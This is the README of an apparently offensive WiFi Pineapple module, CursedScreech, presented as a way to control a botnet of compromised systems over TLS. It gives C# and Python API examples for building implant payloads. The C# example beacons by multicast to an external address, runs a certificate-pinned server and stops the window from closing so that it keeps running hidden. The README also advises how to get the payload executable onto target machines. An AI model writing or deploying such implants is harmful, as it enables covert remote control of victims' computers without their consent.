# CursedScreech

A mass communicator module for the WiFi Pineapple that utilizes TLS to control a botnet of compromised systems.  Included is a C# API and Python API (with documentation) to write payloads that can communicate with CursedScreech.  This module is still in development but will hopefully be ready for it's first full release within the next couple of weeks.

Order of work left on this module:

1. ~~Finish C# API~~
2. ~~Write equivalent Python library~~
3. Put finishing touches on web interface
4. Test, Test, Test
5. Finish documentation and video guide
7. Release on Module Manager


# APIs
I recommend using C# over Python to build your payload.  Both APIs are really simple to use but using C# will allow you to create a self-contained executable along with required keys/certificates.  Writing your payload in Python will require you to freeze your code and it can be difficult, if not impossible, to include all required files in a single executable.  If you can't make a single executable you will have to find a way to move the whole dist directory to the target machine.

### C# API Example
```
using System;
using System.Drawing;
using System.Windows.Forms;
using CursedScreech;

namespace Payload
{
    public partial class Form1 : Form {

        public Form1() {
            InitializeComponent();

            CursedScreech.CursedScreech cs = new CursedScreech.CursedScreech();
            cs.startMulticaster("231.253.78.29", 19578);
            cs.setRemoteCertificateSerial("EF-BE-AD-DE");
            cs.setRemoteCertificateHash("1234567890ABCDEF");
            cs.startSecureServerThread("Payload.Payload.pfx", "#$My$ecuR3P4ssw*rd&");

        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            e.Cancel = true;
            this.Hide();
        }
    }
}

```


### Python API Example
```
from CursedScreech import CursedScreech

cs = CursedScreech("Network Client")
cs.startMulticaster("231.253.78.29", 19578)
cs.setRemoteCertificateSerial("ABCDEF1234567890")
cs.startSecureServerThread("payload.pem", "payload.cer", "cursedscreech.cer")
```
